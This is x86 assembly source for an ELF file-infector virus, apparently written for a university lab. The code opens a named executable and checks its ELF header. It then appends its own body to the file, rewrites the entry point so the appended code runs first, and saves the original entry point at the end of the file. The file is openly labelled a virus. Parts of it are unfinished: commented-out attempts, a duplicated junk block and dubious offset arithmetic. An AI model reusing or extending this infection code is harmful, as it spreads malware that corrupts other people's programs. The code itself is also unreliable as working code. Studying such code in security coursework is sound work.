%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8
%define STDOUT 1
%define STDERR 2

	
	global _start

	section .text
_start:	
	push	ebp
	mov	ebp, esp
	sub	esp, STK_RES            					; Set up ebp and reserve space on the stack for local storage
	call getMyLoc
	add edx, msg-anchor
	mov ecx, edx
	write STDOUT , ecx ,dword 20 					; write message


	open FileName, RDWR ,0777
	cmp eax ,0
	jle fail

;push eax
;	call getMyLoc
;	add edx, msg-anchor
;	mov ecx, edx
;	write STDOUT , ecx ,dword 20 	
;	pop eax

	mov [ebp-4],eax    								; saving the fp to the open file
	mov ecx, ebp
	sub ecx,8
	read [ebp-4] , ecx, 4
	cmp eax,0
	jle fail
	cmp dword [ebp - 8], 0x464C457F
	jne fail
	;mov edx ,[ebp-8]
	;add edx, ENTRY
	;write dword [edx],_start, virus_end - _start

	;;lseek [ebp-4], 0 ,SEEK_SET
	;;mov ecx, eax
	
	
	lseek [ebp-4],0,SEEK_END
	mov dword [ebp-12],eax  						
	
	call getMyLoc
	add edx, _start-anchor
	mov ebx, edx
	call getMyLoc
	add edx, virus_end-anchor
	mov ecx, edx
	sub ecx, ebx
	write dword [ebp-4], ebx, ecx  
    

	lseek [ebp-4] , 0 , SEEK_SET


;	mov ecx,ebp
;	sub ecx, 64 									; 
	;read [ebp-4],ecx, 52 				; 
	;mov ecx , [ebp -64 + ENTRY]
;	mov [ebp - 68], ecx 							
	;mov edx , [ebp - 108]
	;add edx, [ebp -12]
	;mov	ecx, edx 									;


	lseek [ebp-4], 60, SEEK_SET
	mov ecx, ebp
	sub ecx, 16
	read [ebp-4] , ecx, 4

	mov eax, [ebp-16]
	add eax, [ebp-12]

	mov [ebp-20], eax    								
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	lseek [ebp-4] , 24 , SEEK_SET   ;read the original entry point
    ;mov dword [ebp-8], ecx
	mov ecx, ebp
	sub ecx, 24
	read dword [ebp-4] , ecx, 4

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

	lseek [ebp-4] , 24 , SEEK_SET ; rewrite the entry point
    mov dword [ebp-8], ecx
	mov ecx, ebp
	sub ecx, 20
	write dword [ebp - 4],ecx , 4
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
    

	lseek dword [ebp-4] ,-4, SEEK_END ; restore the original entry point on PreviousEntryPoint
	mov ecx, ebp
	sub ecx, 24
	write dword [ebp- 4], ecx, 4

	jmp VirusExit
	fail:
	call getMyLoc
	add edx, PreviousEntryPoint-anchor
	jmp  edx
	;exit 1
	;jmp VirusExit
	   
	;call getMyLoc
	;add edx, errormsg-anchor
	;mov ebx, edx
	;	write STDERR , ebx ,errormsgLength
; You code for this lab goes here

	mov edx, eax
	mov ecx, edx
	add edx, eax
	add edx, 24

	mov edx, eax
	mov ecx, edx
	add edx, eax
	add edx, 24

	jmp VirusExit

	

VirusExit:
       exit 0            ; Termination if all is OK and no previous code to jump to
                         ; (also an example for use of above macros)
getMyLoc:
	call anchor
	anchor:
		pop edx
		ret
	
FileName:	db "ELFexec2short", 0
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
Failstr:        db "perhaps not", 10 , 0
errormsg:        db "ERROR!!!",10 ,0
errormsgLength:   equ $ - errormsg
msg: 		db "This is a virus!!!", 10 , 0
msgLength:	equ $ - msg
	
PreviousEntryPoint: dd VirusExit;8040..
virus_end:


